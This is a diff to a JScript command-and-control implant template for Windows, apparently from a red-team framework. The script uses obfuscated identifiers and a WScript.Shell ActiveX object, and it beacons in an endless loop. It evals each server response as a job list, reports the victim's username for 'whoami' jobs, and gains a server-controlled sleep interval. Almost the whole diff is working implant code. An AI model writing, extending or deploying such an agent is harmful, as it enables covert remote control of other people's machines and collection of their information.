@@ -1,6 +1,7 @@
 var NVBpaEsftE = 0;
 var wscriptshell = new ActiveXObject("WScript.Shell");
-response = '[["{{ check_in_job_id }}"]]';
+var response = '[["{{ check_in_job_id }}"]]';
+var sleep = {{ sleep }};
 
 function eCAOpXulfR(data){
   try {
@@ -26,17 +27,19 @@ while (true) {
       eval("jobs=" + eCAOpXulfR(response).responseText + ";");
       response = '[["{{ check_in_job_id }}"]';
       for (var key in jobs) {
-          if (jobs[key][0] == 'whoami') {
+          if ('sleep' === jobs[key][0]) {
+              sleep = jobs[key][1]
+              response = response + ',["' + key + '","Sleep change to ' +  sleep + ' milliseconds."]';
+          }
+          if ('whoami' === jobs[key][0]) {
               username = wscriptshell.ExpandEnvironmentStrings("%USERNAME%");
               response = response + ',["' + key + '","' +  username + '"]';
           }
-          if (jobs[key][0] == 'downstream') {
-              WScript.Echo(jobs[key][1])
-          }
+
       }
   } catch (e) {
       response = '[["{{ check_in_job_id }}"]]';
   }
   response = response + ']';
-  WScript.Sleep(5000);
+  WScript.Sleep(sleep);
 }
